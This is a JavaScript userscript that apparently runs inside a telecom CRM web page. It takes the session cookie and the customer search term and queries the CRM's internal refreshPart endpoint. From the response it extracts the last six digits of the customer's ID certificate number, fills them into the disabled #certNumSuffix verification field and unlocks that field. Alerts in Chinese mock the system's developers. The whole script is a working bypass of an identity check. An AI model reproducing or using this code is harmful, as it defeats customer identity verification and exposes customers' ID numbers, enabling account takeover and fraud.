(function () {
    setTimeout(function () {
        const aa = document.cookie;
        let cookiesTotal= aa.split(";");
        let cookiesData = cookiesTotal[1].split("=");
        let cookies = cookiesData[1];

        let myObj = document.getElementById("ifrPage100002");

        let inputdata = "";
        let searchData = "accNbr";
        let listObj = "";
        let page = "";
        let answerData = ""

        let seacchBty = myObj.contentWindow.document.getElementsByClassName("yn-search-ico")[0];
        if(seacchBty){
            alert("点击确定请开始你的表演");
            let inputObj  = myObj.contentWindow.document.querySelector("#qryCustomerInputStr");
            if(inputObj){
                inputdata = inputObj.value;
            }

            let searchObj = myObj.contentWindow.document.querySelector("#multSearchType").getElementsByTagName("span");
            if( searchObj[0].getAttribute("data-type")){
                searchData = searchObj[0].getAttribute("data-type");
            }

            setTimeout(function () {
                let listObj = myObj.contentWindow.document.querySelector("#resultList");
                if(listObj){
                    alert("劝告该系统开发人员一句，别再坑爹了，转行吧！！！！");
                }
                listObj.addEventListener("click", function(e){
                    // e.stopPropagation();
                    alert("点击确定下一步");
                    setTimeout(function (){
                        // 存储搜索页
                        let pageObj = myObj.contentWindow.document.getElementsByClassName("active")[0];
                        if(pageObj){
                            page = pageObj.innerHTML;
                        }

                        let answerObj = myObj.contentWindow.document.querySelector("#content1");
                        let answerdatas = answerObj.getElementsByTagName("span")[0].innerHTML;
                        let num = answerdatas.split("");
                        answerData = `${num[num.length-4]}${num[num.length-3]}${num[num.length-2]}${num[num.length-1]}`;
                        getData();
                    }, 3000);
                });
            },2000)
            // seacchBty.addEventListener("ckick",function () {
            //
            // })
        };
        function getData() {
            let params1 = "";
            let methodName = "";
            if(page >1){
                params1 = `["${inputdata}","${searchData}","${cookies}","${page}"，"10""3c156b221d634851a79b446ad23246ec"]`;
                methodName = "searchCustOnly";
            }else{
                params1 = `["${inputdata}","${searchData}","${cookies}","3c156b221d634851a79b446ad23246ec"]`;
                methodName = "searchCustForFixedAccNum";
            }
            const xhr = new XMLHttpRequest();
            xhr.onreadystatechange = callback1;
            xhr.open("post", "http://crm3.yn.189.cn:9500/crm/so/refreshPart",true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            if(page >1){
                xhr.send("widgetName="+"searchOffer"+"&methodName="+methodName+"&params="+params1+"&selector="+"#searchList");
            }else{
                xhr.send("widgetName="+"searchOffer"+"&methodName="+methodName+"&params="+params1+"&selector="+"#searchList"+"&keyName="+"");
            }

            function callback1() {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    let data = xhr.responseText;
                    let cardList1 = JSON.stringify(data).split("\\");
                    let cardList2 = [];
                    for(let i in cardList1){
                        if(cardList1[i].replace('"', '').includes(answerData.toString())){
                            cardList2.push(cardList1[i].replace('"', ''));
                        }
                    }
                    let dataCard = cardList2[1].substring(cardList2[1].length-6);
                    let card = myObj.contentWindow.document.querySelector("#certNumSuffix");
                    if(card != null){
                        card.value = dataCard;
                        card.removeAttribute('disabled');
                    }
                }
            }
        }
    },3000)
})();

